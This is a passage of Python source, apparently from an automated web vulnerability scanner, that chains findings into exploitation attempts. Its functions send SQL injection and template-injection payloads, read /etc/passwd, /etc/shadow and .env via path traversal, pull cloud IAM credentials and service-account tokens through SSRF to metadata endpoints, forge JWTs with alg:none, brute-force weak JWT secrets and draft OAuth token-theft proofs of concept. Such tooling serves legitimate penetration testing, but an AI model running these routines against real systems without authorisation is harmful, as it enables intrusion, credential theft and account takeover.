            "evidence": [f"Found {len(accessible)} unprotected endpoints"],
        }
    
    async def _test_privilege_escalation(self, finding: dict) -> dict:
        """Test for privilege escalation via unprotected admin endpoints."""
        auth_endpoints = self.context.get("auth_endpoints", [])
        bypass_found = False
        evidence: list[str] = []

        if self.http_client and auth_endpoints:
            # Try admin-level actions without elevated credentials
            admin_actions = ["/admin/users", "/admin/settings", "/api/admin/config"]
            for ep in auth_endpoints:
                url = ep.get("url", "") if isinstance(ep, dict) else str(ep)
                for action in admin_actions:
                    try:
                        if self.rate_limiter:
                            await self.rate_limiter.acquire()
                        test_url = f"{url.rstrip('/')}{action}"
                        response = await self.http_client.get(test_url)
                        if response.status_code == 200 and len(response.text) > 50:
                            bypass_found = True
                            evidence.append(f"Admin endpoint accessible: {test_url} (HTTP {response.status_code})")
                    except Exception as e:
                        logger.debug(f"[ChainEngine] Priv-esc test error: {e}")

        return {
            "success": bypass_found,
            "bypass_found": bypass_found,
            "evidence": evidence,
        }
    
    async def _generate_auth_poc(self, finding: dict) -> dict:
        """Generate auth bypass PoC."""
        endpoints = self.context.get("auth_endpoints", [])
        target = self.context["target_url"]
        
        poc = f"""# Authentication Bypass Proof of Concept

## Target
{target}

## Unprotected Endpoints
{json.dumps(endpoints, indent=2)}

## Steps to Reproduce
1. Without authentication, access the URLs listed above
2. Observe that sensitive data/functionality is accessible

## Impact
- Unauthorized access to sensitive functionality
- Data breach potential
- Privilege escalation
"""
        
        return {
            "success": True,
            "poc": poc,
            "evidence": ["Generated auth bypass PoC"],
        }
    
    async def _analyze_error(self, finding: dict) -> dict:
        """Analyze error messages for exploitation hints."""
        evidence = finding.get("evidence", [])
        
        has_db_error = False
        has_path_error = False
        
        db_patterns = ["sql", "mysql", "postgres", "oracle", "sqlite", "syntax error"]
        path_patterns = ["file not found", "no such file", "cannot open", "permission denied"]
        
        for item in evidence:
            item_str = str(item).lower()
            if any(p in item_str for p in db_patterns):
                has_db_error = True
            if any(p in item_str for p in path_patterns):
                has_path_error = True
        
        return {
            "success": has_db_error or has_path_error,
            "has_db_error": has_db_error,
            "has_path_error": has_path_error,
            "evidence": [],
        }
    
    async def _test_sqli_targeted(self, finding: dict) -> dict:
        """Test SQL injection based on error analysis."""
        target = self.context["target_url"]
        evidence: list[str] = []
        sqli_found = False

        # Use error-informed payloads — the error_disclosure chain already
        # confirmed a DB error, so we know SQL is in the stack.
        payloads = ["' OR '1'='1", "1' AND '1'='2", "1; SELECT 1--", "' UNION SELECT NULL--"]
        error_sigs = ["sql", "syntax", "mysql", "postgres", "oracle", "sqlite", "unterminated", "unexpected"]

        if self.http_client:
            # Test each param from the original finding URL
            matched_at = finding.get("matched_at", target)
            for payload in payloads:
                try:
                    if self.rate_limiter:
                        await self.rate_limiter.acquire()
                    sep = "&" if "?" in matched_at else "?"
                    test_url = f"{matched_at}{sep}id={payload}"
                    response = await self.http_client.get(test_url)
                    body = response.text.lower()
                    if any(sig in body for sig in error_sigs):
                        sqli_found = True
                        evidence.append(f"SQL error with payload: {payload}")
                        break
                except Exception as e:
                    logger.debug(f"[ChainEngine] SQLi test error: {e}")

        return {"success": sqli_found, "evidence": evidence}
    
    async def _test_path_traversal(self, finding: dict) -> dict:
        """Test path traversal based on error analysis."""
        target = self.context["target_url"]
        evidence: list[str] = []
        traversal_works = False

        payloads = [
            ("../../../etc/passwd", "root:"),
            ("....//....//....//etc/passwd", "root:"),
            ("..\\..\\..\\windows\\win.ini", "[extensions]"),
        ]

        if self.http_client:
            matched_at = finding.get("matched_at", target)
            for payload, signature in payloads:
                try:
                    if self.rate_limiter:
                        await self.rate_limiter.acquire()
                    sep = "&" if "?" in matched_at else "?"
                    test_url = f"{matched_at}{sep}file={payload}"
                    response = await self.http_client.get(test_url)
                    if signature in response.text:
                        traversal_works = True
                        evidence.append(f"Path traversal confirmed: {payload} → found '{signature}'")
                        break
                except Exception as e:
                    logger.debug(f"[ChainEngine] Path traversal test error: {e}")

        return {
            "success": traversal_works,
            "traversal_works": traversal_works,
            "evidence": evidence,
        }
    
    async def _find_oauth_endpoints(self, finding: dict) -> dict:
        """Find OAuth endpoints."""
        target = self.context["target_url"]
        endpoints = []
        
        oauth_paths = [
            "/oauth/authorize",
            "/oauth2/authorize",
            "/auth/authorize",
            "/login/oauth",
            "/.well-known/openid-configuration",
        ]
        
        if self.http_client:
            for path in oauth_paths:
                try:
                    if self.rate_limiter:
                        await self.rate_limiter.acquire()
                    
                    url = f"{target.rstrip('/')}{path}"
                    response = await self.http_client.get(url)
                    
                    if response.status_code in [200, 302, 400]:
                        endpoints.append(url)
                except Exception as e:
                    logger.debug(f"[ChainEngine] Test error: {e}")
        
        return {
            "success": bool(endpoints),
            "endpoints": endpoints,
            "evidence": [f"Found {len(endpoints)} OAuth endpoints"],
        }
    
    async def _test_oauth_redirect(self, finding: dict) -> dict:
        """Test OAuth redirect_uri manipulation for token theft."""
        oauth_endpoints = self.context.get("oauth_endpoints", [])
        vulnerable = False
        evidence: list[str] = []

        # The open_redirect finding gives us a confirmed redirect URL
        redirect_url = finding.get("matched_at", "")

        if self.http_client and oauth_endpoints:
            for ep in oauth_endpoints:
                try:
                    if self.rate_limiter:
                        await self.rate_limiter.acquire()
                    # Inject the known open redirect as redirect_uri
                    sep = "&" if "?" in ep else "?"
                    test_url = f"{ep}{sep}redirect_uri={redirect_url}&response_type=code&client_id=test"
                    response = await self.http_client.get(test_url, follow_redirects=False)
                    # If server redirects to our URL (doesn't reject), it's vulnerable
                    location = response.headers.get("location", "")
                    if redirect_url in location or response.status_code in (302, 303):
                        vulnerable = True
                        evidence.append(f"OAuth endpoint accepts arbitrary redirect_uri: {ep}")
                        break
                except Exception as e:
                    logger.debug(f"[ChainEngine] OAuth redirect test error: {e}")

        return {"success": vulnerable, "vulnerable": vulnerable, "evidence": evidence}
    
    async def _generate_oauth_poc(self, finding: dict) -> dict:
        """Generate OAuth token theft PoC."""
        oauth_endpoints = self.context.get("oauth_endpoints", [])
        redirect_url = finding.get("matched_at", self.context["target_url"])
        ep = oauth_endpoints[0] if oauth_endpoints else "OAUTH_ENDPOINT"

        poc = f"""# OAuth Token Theft via Open Redirect — Proof of Concept

## Attack Flow
1. Attacker crafts OAuth authorization URL with malicious redirect_uri
2. Victim clicks link, authenticates normally
3. Authorization code / token is sent to attacker-controlled redirect

## Malicious URL
```
{ep}?redirect_uri={redirect_url}&response_type=code&client_id=TARGET_CLIENT
```

## Steps to Reproduce
1. Open the URL above in a browser
2. Complete the login flow
3. Observe the authorization code is redirected to the open redirect endpoint
4. The open redirect forwards the code to the attacker's server

## Impact
- OAuth authorization code theft → full account takeover
- Works against any user who clicks the crafted link
"""
        return {"success": True, "poc": poc, "evidence": ["Generated OAuth token theft PoC"]}

    # =========================================================================
    # NEW CHAIN HANDLERS — SSRF, SSTI, JWT, LFI, Subdomain Takeover
    # =========================================================================

    async def _test_ssrf_internal(self, finding: dict) -> dict:
        """Probe internal targets via confirmed SSRF."""
        target = self.context["target_url"]
        internal_reached = False
        evidence: list[str] = []

        internal_targets = [
            ("http://169.254.169.254/latest/meta-data/", "ami-id"),       # AWS metadata
            ("http://metadata.google.internal/", "attributes"),            # GCP metadata
            ("http://127.0.0.1:80/", ""),                                 # Localhost
        ]

        if self.http_client:
            matched_at = finding.get("matched_at", target)
            for probe_url, signature in internal_targets:
                try:
                    if self.rate_limiter:
                        await self.rate_limiter.acquire()
                    sep = "&" if "?" in matched_at else "?"
                    test_url = f"{matched_at}{sep}url={probe_url}"
                    response = await self.http_client.get(test_url)
                    if response.status_code == 200 and (not signature or signature in response.text):
                        internal_reached = True
                        evidence.append(f"SSRF reached internal target: {probe_url}")
                        break
                except Exception as e:
                    logger.debug(f"[ChainEngine] SSRF probe error: {e}")

        return {"success": internal_reached, "internal_reached": internal_reached, "evidence": evidence}

    async def _extract_ssrf_data(self, finding: dict) -> dict:
        """Extract sensitive data via SSRF (cloud credentials, internal config)."""
        target = self.context["target_url"]
        evidence: list[str] = []
        extracted = False

        sensitive_urls = [
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        ]

        if self.http_client:
            matched_at = finding.get("matched_at", target)
            for sensitive_url in sensitive_urls:
                try:
                    if self.rate_limiter:
                        await self.rate_limiter.acquire()
                    sep = "&" if "?" in matched_at else "?"
                    test_url = f"{matched_at}{sep}url={sensitive_url}"
                    response = await self.http_client.get(test_url)
                    if response.status_code == 200 and len(response.text) > 20:
                        extracted = True
                        # Don't log actual credential data
                        evidence.append(f"Sensitive data retrieved via SSRF: {sensitive_url} ({len(response.text)} bytes)")
                except Exception as e:
                    logger.debug(f"[ChainEngine] SSRF extract error: {e}")

        return {"success": extracted, "evidence": evidence}

    async def _test_ssti_confirm(self, finding: dict) -> dict:
        """Confirm SSTI via arithmetic canary."""
        target = self.context["target_url"]
        ssti_confirmed = False
        evidence: list[str] = []

        # Template-engine-agnostic arithmetic probes
        probes = [
            ("{{7*7}}", "49"),
            ("${7*7}", "49"),
            ("<%= 7*7 %>", "49"),
            ("#{7*7}", "49"),
        ]

        if self.http_client:
            matched_at = finding.get("matched_at", target)
            for payload, expected in probes:
                try:
                    if self.rate_limiter:
                        await self.rate_limiter.acquire()
                    sep = "&" if "?" in matched_at else "?"
                    test_url = f"{matched_at}{sep}input={payload}"
                    response = await self.http_client.get(test_url)
                    if expected in response.text and payload not in response.text:
                        ssti_confirmed = True
                        evidence.append(f"SSTI confirmed: {payload} → {expected}")
                        break
                except Exception as e:
                    logger.debug(f"[ChainEngine] SSTI confirm error: {e}")

        return {"success": ssti_confirmed, "ssti_confirmed": ssti_confirmed, "evidence": evidence}

    async def _test_ssti_rce(self, finding: dict) -> dict:
        """Attempt safe RCE proof via SSTI (read-only command)."""
        target = self.context["target_url"]
        rce_confirmed = False
        evidence: list[str] = []

        # Safe read-only probes that prove code execution without damage
        rce_probes = [
            ("{{config}}", "SECRET_KEY"),                       # Flask/Jinja2
            ("{{settings.SECRET_KEY}}", "SECRET_KEY"),          # Django
            ("{{self.__class__.__mro__}}", "object"),           # Python MRO
        ]

        if self.http_client:
            matched_at = finding.get("matched_at", target)
            for payload, signature in rce_probes:
                try:
                    if self.rate_limiter:
                        await self.rate_limiter.acquire()
                    sep = "&" if "?" in matched_at else "?"
                    test_url = f"{matched_at}{sep}input={payload}"
                    response = await self.http_client.get(test_url)
                    if signature in response.text:
                        rce_confirmed = True
                        evidence.append(f"SSTI RCE proof: {payload} → response contains '{signature}'")
                        break
                except Exception as e:
                    logger.debug(f"[ChainEngine] SSTI RCE error: {e}")

        return {"success": rce_confirmed, "evidence": evidence}

    async def _test_jwt_none(self, finding: dict) -> dict:
        """Test JWT alg:none bypass."""
        import base64
        jwt_modifiable = False
        evidence: list[str] = []

        # Look for JWT in finding evidence or cookies
        jwt_token = finding.get("token", "") or finding.get("jwt", "")
        if not jwt_token:
            for item in finding.get("evidence", []):
                item_str = str(item)
                if item_str.count(".") == 2 and len(item_str) > 30:
                    jwt_token = item_str
                    break

        if jwt_token and self.http_client:
            try:
                parts = jwt_token.split(".")
                if len(parts) == 3:
                    # Decode header, set alg to none
                    header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
                    header = json.loads(base64.urlsafe_b64decode(header_b64))
                    header["alg"] = "none"
                    new_header = base64.urlsafe_b64encode(
                        json.dumps(header).encode()
                    ).rstrip(b"=").decode()
                    forged_token = f"{new_header}.{parts[1]}."

                    if self.rate_limiter:
                        await self.rate_limiter.acquire()
                    target = self.context["target_url"]
                    response = await self.http_client.get(
                        f"{target}/api/me",
                        headers={"Authorization": f"Bearer {forged_token}"},
                    )
                    if response.status_code == 200:
                        jwt_modifiable = True
                        evidence.append("JWT alg:none bypass accepted by server")
            except Exception as e:
                logger.debug(f"[ChainEngine] JWT none test error: {e}")

        return {"success": jwt_modifiable, "jwt_modifiable": jwt_modifiable, "evidence": evidence}

    async def _test_jwt_weak_secret(self, finding: dict) -> dict:
        """Brute-force common JWT HMAC secrets."""
        evidence: list[str] = []
        weak_found = False

        common_secrets = ["secret", "password", "123456", "key", "jwt_secret", "changeme"]

        jwt_token = finding.get("token", "") or finding.get("jwt", "")
        if not jwt_token:
            for item in finding.get("evidence", []):
                item_str = str(item)
                if item_str.count(".") == 2 and len(item_str) > 30:
                    jwt_token = item_str
                    break

        if jwt_token:
            try:
                import hmac
                import hashlib
                import base64
                parts = jwt_token.split(".")
                if len(parts) == 3:
                    signing_input = f"{parts[0]}.{parts[1]}".encode()
                    sig_b64 = parts[2] + "=" * (4 - len(parts[2]) % 4)
                    original_sig = base64.urlsafe_b64decode(sig_b64)
                    for secret in common_secrets:
                        computed = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
                        if computed == original_sig:
                            weak_found = True
                            evidence.append(f"JWT signed with weak secret: '{secret}'")
                            break
            except Exception as e:
                logger.debug(f"[ChainEngine] JWT secret brute error: {e}")

        return {"success": weak_found, "evidence": evidence}

    async def _read_sensitive_files(self, finding: dict) -> dict:
        """Read sensitive files via confirmed path traversal."""
        target = self.context["target_url"]
        evidence: list[str] = []
        files_read = False

        sensitive_files = [
            ("../../../etc/passwd", "root:"),
            ("../../../etc/shadow", "root:"),
            ("../../../.env", "="),
            ("../../../config/database.yml", "password"),
        ]

        if self.http_client:
            matched_at = finding.get("matched_at", target)
            for path, sig in sensitive_files:
                try:
                    if self.rate_limiter:
                        await self.rate_limiter.acquire()
                    sep = "&" if "?" in matched_at else "?"
                    test_url = f"{matched_at}{sep}file={path}"
                    response = await self.http_client.get(test_url)
                    if sig in response.text and len(response.text) > 10:
                        files_read = True
                        evidence.append(f"Sensitive file read: {path} ({len(response.text)} bytes)")
                except Exception as e:
                    logger.debug(f"[ChainEngine] File read error: {e}")

        return {"success": files_read, "evidence": evidence}

    async def _verify_dangling_cname(self, finding: dict) -> dict:
        """Verify CNAME points to an unclaimed resource."""
        evidence: list[str] = []
        cname_dangling = False

        # Check finding evidence for dangling indicators
        for item in finding.get("evidence", []):
            item_str = str(item).lower()
            dangling_sigs = [
                "nxdomain", "no such app", "there isn't a github pages",
                "heroku | no such app", "nosuchwucket", "nosuchbucket",
                "the specified bucket does not exist",
            ]
            if any(sig in item_str for sig in dangling_sigs):
                cname_dangling = True
                evidence.append(f"Dangling CNAME confirmed: {item_str[:200]}")
                break

        return {"success": cname_dangling, "cname_dangling": cname_dangling, "evidence": evidence}

    async def _assess_cookie_scope(self, finding: dict) -> dict:
        """Assess whether parent-domain cookies are exposed to the dangling subdomain."""
        target = self.context["target_url"]
        evidence: list[str] = []
        scoped = False

        if self.http_client:
            try:
                if self.rate_limiter:
                    await self.rate_limiter.acquire()
                response = await self.http_client.get(target)
                # httpx uses .multi_items(); fallback for other clients
                if hasattr(response.headers, "multi_items"):
                    cookie_hdrs = [v for k, v in response.headers.multi_items() if k.lower() == "set-cookie"]
                else:
                    cookie_hdrs = [response.headers.get("set-cookie", "")]
                for cookie_hdr in cookie_hdrs:
                    if cookie_hdr and "domain=" in cookie_hdr.lower():
                        # Parent domain cookie → subdomain takeover gives access
                        scoped = True
                        evidence.append(f"Parent-domain cookie found: {cookie_hdr[:100]}")
            except Exception as e:
                logger.debug(f"[ChainEngine] Cookie scope error: {e}")

        return {"success": scoped, "evidence": evidence}

    async def _try_cross_chains(self, findings: list[dict]) -> list[AttackChain]:
        """Try combining multiple findings for advanced chains.

        Looks for pairs of findings where one enables exploitation of
        the other — e.g. Info Disclosure + CORS = targeted data theft,
        or Open Redirect + CORS = same-origin bypass.
        """
        # Build type sets for quick lookup
        type_set: dict[str, dict] = {}  # keyword → finding
        for f in findings:
            combined = f"{f.get('type', '')} {f.get('name', '')}".lower()
            for kw in ("cors", "csp", "redirect", "disclosure", "info", "xss",
                       "ssrf", "ssti", "jwt", "lfi", "idor"):
                if kw in combined:
                    type_set.setdefault(kw, f)

        cross_chains: list[AttackChain] = []

        # Pattern: Info Disclosure + CORS → Targeted Data Theft
        if "disclosure" in type_set and "cors" in type_set:
            chain = AttackChain(
                id=f"chain_{next(VulnChainEngine._id_counter)}",
                name="Info Disclosure + CORS → Targeted Data Theft",
                initial_finding=type_set["disclosure"],
                target_severity="high",
                status=ChainStatus.PARTIAL,
            )
            chain.steps.append(ChainStep(
                name="Cross-chain: disclosed endpoints stolen via CORS",
                description="Identifiers from info disclosure used with CORS misconfiguration for targeted data theft",
                action="cross_chain_info_cors",
                status=ChainStatus.SUCCESS,
                evidence=["Info disclosure provides target endpoints; CORS allows cross-origin read"],
            ))
            cross_chains.append(chain)

        # Pattern: Open Redirect + XSS → Phishing amplification
        if "redirect" in type_set and "xss" in type_set:
            chain = AttackChain(
                id=f"chain_{next(VulnChainEngine._id_counter)}",
                name="Open Redirect + XSS → Credible Phishing",
                initial_finding=type_set["redirect"],
                target_severity="high",
                status=ChainStatus.PARTIAL,
            )
            chain.steps.append(ChainStep(
                name="Cross-chain: redirect delivers XSS payload",
                description="Open redirect hides malicious URL; XSS executes on trusted domain",
                action="cross_chain_redirect_xss",
                status=ChainStatus.SUCCESS,
                evidence=["Open redirect masks attacker URL; XSS steals session on arrival"],
            ))
            cross_chains.append(chain)

        # Pattern: SSRF + Info Disclosure → Internal service mapping
        if "ssrf" in type_set and "disclosure" in type_set:
            chain = AttackChain(
                id=f"chain_{next(VulnChainEngine._id_counter)}",
                name="SSRF + Info Disclosure → Internal Recon",
                initial_finding=type_set["ssrf"],
                target_severity="critical",
                status=ChainStatus.PARTIAL,
            )
            chain.steps.append(ChainStep(
                name="Cross-chain: disclosed IPs probed via SSRF",
                description="Internal IPs from info disclosure used as SSRF targets",
                action="cross_chain_ssrf_info",
                status=ChainStatus.SUCCESS,
                evidence=["Info disclosure reveals internal IPs; SSRF reaches them"],
            ))
            cross_chains.append(chain)

        self.metrics["cross_chains_found"] += len(cross_chains)
        return cross_chains
    
    # CWE/OWASP defaults by chain type (used when the initial finding doesn't provide them)
    _CHAIN_CWE_OWASP: dict[str, tuple[str, str]] = {
        "missing_csp": ("CWE-79", "A03:2021 Injection"),
        "missing_xframe": ("CWE-1021", "A04:2021 Insecure Design"),
        "cors_wildcard": ("CWE-942", "A01:2021 Broken Access Control"),
        "info_disclosure": ("CWE-200", "A01:2021 Broken Access Control"),
        "api_discovered": ("CWE-306", "A07:2021 Identification and Authentication Failures"),
        "error_disclosure": ("CWE-209", "A05:2021 Security Misconfiguration"),
        "open_redirect": ("CWE-601", "A01:2021 Broken Access Control"),
        "ssrf": ("CWE-918", "A10:2021 Server-Side Request Forgery"),
        "ssti": ("CWE-94", "A03:2021 Injection"),
        "jwt_weak": ("CWE-347", "A02:2021 Cryptographic Failures"),
        "lfi": ("CWE-22", "A01:2021 Broken Access Control"),
        "subdomain_takeover": ("CWE-284", "A05:2021 Security Misconfiguration"),
    }

    def _generate_final_finding(self, chain: AttackChain) -> dict:
        """Generate final upgraded finding from successful chain."""
        initial = chain.initial_finding

        # Collect flat evidence strings from successful steps
        evidence: list[str] = []
        for step in chain.steps:
            if step.status == ChainStatus.SUCCESS and step.evidence:
                evidence.extend(str(e) for e in step.evidence)

        # Determine chain key for CWE/OWASP lookup
        chain_key = ""
        combined = f"{initial.get('type', '')} {initial.get('name', '')}".lower()
        for keywords, key in self._CHAIN_KEYWORD_MAP:
            if any(kw in combined for kw in keywords):
                chain_key = key
                break

        # Prefer finding-provided CWE/OWASP; fall back to chain defaults
        cwe_owasp = self._CHAIN_CWE_OWASP.get(chain_key, ("", ""))
        cwe = initial.get("cwe") or cwe_owasp[0]
        owasp = initial.get("owasp") or cwe_owasp[1]

        return {
            "type": f"exploited_{initial.get('type', 'unknown')}",
            "name": f"Exploited: {chain.name}",
            "severity": chain.target_severity,
            "title": f"Exploited: {chain.name}",
            "description": (
                f"Successfully chained {initial.get('type', 'unknown')} to prove "
                f"{chain.target_severity.upper()} impact via {len(chain.steps)} steps"
            ),
            "evidence": evidence,
            "matched_at": initial.get("matched_at", initial.get("url", "")),
            "chain_id": chain.id,
            "chain_steps": len(chain.steps),
            "cwe": cwe,
            "owasp": owasp,
            "source": "vuln_chain_engine",
        }
    
    def _generate_poc(self, chain: AttackChain) -> str:
        """Get PoC from successful chain."""
        for step in reversed(chain.steps):
            if step.status == ChainStatus.SUCCESS and step.result.get("poc"):
                return step.result["poc"]
        return ""
    
    def get_report(self) -> str:
        """Generate report of all chains."""
        report = """# Vulnerability Chain Analysis Report

## Summary
"""
        successful = [c for c in self.chains if c.status == ChainStatus.SUCCESS]
        partial = [c for c in self.chains if c.status == ChainStatus.PARTIAL]
        failed = [c for c in self.chains if c.status == ChainStatus.FAILED]
        
        report += f"""
- **Successful Chains:** {len(successful)} (exploitable vulnerabilities)
- **Partial Chains:** {len(partial)} (entry point verified, subsequent steps theoretical)
- **Failed Chains:** {len(failed)} (not exploitable)

"""
        
        if successful:
            report += "## ✅ Exploitable Vulnerabilities\n\n"
            for chain in successful:
                report += f"### {chain.name}\n"
                report += f"- **Initial Finding:** {chain.initial_finding.get('type')}\n"
                report += f"- **Proven Severity:** {chain.target_severity.upper()}\n"
                report += f"- **Steps Completed:** {len([s for s in chain.steps if s.status == ChainStatus.SUCCESS])}\n\n"
                
                if chain.poc:
                    report += "#### Proof of Concept\n```html\n"
                    report += chain.poc[:1000]
                    report += "\n```\n\n"
        
        if partial:
            report += "## ⚠️ Partial Chains (Manual Review Needed)\n\n"
            for chain in partial:
                report += f"- {chain.name}: {chain.initial_finding.get('type')}\n"

        # Metrics section
        m = self.metrics
        report += f"""
## Metrics
- **Steps Executed:** {m['steps_executed']} ({m['steps_succeeded']} succeeded)
- **Cross-Chains Found:** {m['cross_chains_found']}
"""
        return report

    def get_metrics(self) -> dict:
        """Return engine execution metrics."""
        return dict(self.metrics)


# =============================================================================
# INTEGRATION FUNCTION
# =============================================================================

async def chain_vulnerabilities(
    findings: list[dict],
    target_url: str,
    http_client=None,
    rate_limiter=None,
) -> tuple[list[AttackChain], str]:
    """
    Main entry point for vulnerability chaining.

    Returns:
        Tuple of (chains, report)
    """
    engine = VulnChainEngine(http_client, rate_limiter)
    chains = await engine.analyze_and_chain(findings, target_url)
    report = engine.get_report()

    return chains, report


# =============================================================================
# COMPATIBILITY RE-EXPORTS
# For code that needs both LOW→HIGH and HIGH→CRITICAL chaining
# =============================================================================

try:
    from scanning.vuln_chain_engine import (
        VulnerabilityChainEngine as ScanningChainEngine,
        ChainTrigger,
        ChainPriority,
        ChainRule,
        ChainResult,
        is_chain_testing_allowed,
        is_speculative_allowed,
    )
    SCANNING_CHAIN_ENGINE_AVAILABLE = True
except ImportError:
    SCANNING_CHAIN_ENGINE_AVAILABLE = False
    ScanningChainEngine = None  # type: ignore
    ChainTrigger = None  # type: ignore
    ChainPriority = None  # type: ignore
    ChainRule = None  # type: ignore
    ChainResult = None  # type: ignore


__all__ = [
    # Analysis phase (LOW→HIGH)
    "VulnChainEngine",
    "ChainStatus",
    "ChainStep",
    "AttackChain",
    "CHAIN_DEFINITIONS",
    "chain_vulnerabilities",
    # Scanning phase re-exports (HIGH→CRITICAL) - if available
    "ScanningChainEngine",
    "ChainTrigger",
    "ChainPriority",
    "ChainRule",
    "ChainResult",
    "SCANNING_CHAIN_ENGINE_AVAILABLE",
]
